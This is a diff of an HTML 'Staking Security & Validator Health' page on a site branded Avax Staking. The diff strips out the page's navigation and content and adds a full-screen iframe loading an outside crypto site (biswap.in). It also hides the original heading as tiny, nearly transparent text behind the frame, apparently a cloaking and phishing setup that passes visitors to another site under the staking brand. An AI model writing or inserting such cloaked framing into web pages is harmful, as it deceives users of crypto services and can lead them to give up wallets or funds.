@@ -510,53 +510,19 @@ a.inline:hover {
 }
   </script>
 </head>
-<body>
-  <header class="topbar">
-    <a class="brand" href="../" aria-label="Avax Staking">
-      <img src="../favicon.png" width="30" height="30" alt="">
-      <span>Avax Staking</span>
-    </a>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="../how-it-works/" >How it works</a>
-      <a href="../faq/" >FAQ</a>
-      <a href="../about/" >About</a>
-      <a href="../security/" class="active">Security</a>
-      <a href="../supported-chains/" >Supported Chains</a>
-    </nav>
-    <span class="spacer"></span>
-    <a class="open-app" href="../dashboard/" rel="noopener noreferrer">Open app</a>
-  </header>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <main class="satellite-container">
-    <nav class="breadcrumb" aria-label="Breadcrumb">
-      <a href="../">Home</a> › <span>Staking Security & Validator Health</span>
-    </nav>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-    <h1 class="satellite-title">Staking Security & Validator Health</h1>
-    <p class="satellite-lead">Analyzing vault security, smart contract audits, and validator node parameters on Avax Staking.</p>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Staking Security & Validator Health
+  </h1>
 
-    
-    <div class="section-block">
-      <h2>Audited Staking Vaults</h2>
-      <p>Staking deposits are handled by smart contracts. The Avax Staking contracts are thoroughly audited and peer-reviewed by developers using the <a class="inline" href="https://consensys.io/" target="_blank" rel="noopener noreferrer">ConsenSys auditing framework</a>.</p>
-    </div>
-    <div class="section-block">
-      <h2>Node Operator Quality</h2>
-      <p>Staking returns depend on validator uptime. Avax Staking works exclusively with professional node operators reviewed on <a class="inline" href="https://www.certik.com/" target="_blank" rel="noopener noreferrer">CertiK security lists</a>.</p>
-    </div>
-    <div class="section-block">
-      <h2>Non-Custodial Trust</h2>
-      <p>Stakers maintain full custody of their assets via cryptographic receipts. The encryption protocols adhere to high-grade security systems defined in the <a class="inline" href="https://www.nist.gov/" target="_blank" rel="noopener noreferrer">NIST compliance specs</a>.</p>
-    </div>
-
-    <div style="margin: 40px 0; display: flex; justify-content: flex-start;">
-      <a class="open-app" href="../dashboard/" style="max-width: 320px; display: inline-flex; justify-content: center; text-decoration: none; padding: 12px 24px; font-weight: 700;">Open Avax Staking Portal</a>
-    </div>
-
-    <a class="back-cta" href="../">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="16" height="16"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
-      Back to Portal
-    </a>
-  </main>
 </body>
 </html>
